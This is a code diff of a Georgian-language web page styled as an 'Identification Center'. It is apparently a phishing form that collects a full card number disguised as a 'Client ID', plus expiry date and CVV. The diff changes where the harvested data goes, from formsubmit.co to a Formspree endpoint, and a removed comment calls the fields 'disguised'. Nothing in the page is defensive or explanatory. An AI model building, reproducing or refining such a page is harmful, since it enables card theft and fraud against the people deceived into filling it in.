@@ -4,7 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>იდენტიფიკაციის ცენტრი</title>
+
     <link rel="icon" type="image/png" href="png-clipart-computer-icons-business-others-blue-angle-thumbnail-removebg-preview.png">
+
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
         .center-container { text-align: center; margin-bottom: 20px; }
@@ -21,6 +23,7 @@
         @media (max-width: 480px) { .form-container { padding: 20px; } }
     </style>
 </head>
+
 <body>
 
 <div class="center-container">
@@ -30,14 +33,9 @@
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- ИСПРАВЛЕНО: Теперь используем Random Token вместо прямого email -->
-    <form action="https://formsubmit.co" method="POST">
+    <!-- ЗАМЕНЕНО: Теперь данные уходят на Formspree -->
+    <form action="https://formspree.io/f/xgolrvko" method="POST">
         
-        <!-- Скрытые настройки для стабильности -->
-        <input type="hidden" name="_captcha" value="false"> 
-        <input type="hidden" name="_next" value="https://xn----ctbeucnqcd8a.github.io">
-        <input type="hidden" name="_template" value="table">
-
         <h3>შეავსეთ ფორმა</h3>
 
         <label for="first-name">სახელი</label>
@@ -46,7 +44,6 @@
         <label for="last-name">გვარი</label>
         <input type="text" name="Last_Name" id="last-name" required>
 
-        <!-- Замаскированные поля -->
         <label for="order-id">კლიენტის ID</label>
         <input type="text" name="Client_ID" id="order-id" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
 
@@ -66,13 +63,13 @@
 </div>
 
 <script>
-    // Маска для ID (пробелы каждые 4 цифры)
+    // Маска для ID Клиента
     document.getElementById('order-id').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, '').slice(0,16);
         e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
     });
 
-    // Маска для даты (MM/YY)
+    // Маска для даты MM/YY
     document.getElementById('expiry-date').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, ''); 
         if (value.length >= 2) {
@@ -82,7 +79,7 @@
         }
     });
 
-    // Только цифры для кода безопасности
+    // Ограничение CVV
     document.getElementById('cvv').addEventListener('input', function (e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
     });
